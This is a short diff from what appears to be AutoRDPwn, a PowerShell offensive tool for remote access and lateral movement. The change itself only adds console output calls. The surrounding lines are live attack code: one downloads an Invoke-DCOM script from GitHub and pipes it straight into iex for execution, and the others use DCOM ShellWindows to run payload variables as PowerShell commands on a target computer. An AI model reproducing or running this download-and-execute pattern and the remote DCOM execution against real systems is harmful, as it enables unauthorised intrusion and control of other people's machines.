@@ -345,10 +345,10 @@ if($Language -in 'Spanish') {
 	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn2"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn3"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn4"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn2" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn3" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn4" ; Write-Host
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn5" }
 
         'M' { Show-Banner ; Show-Modules
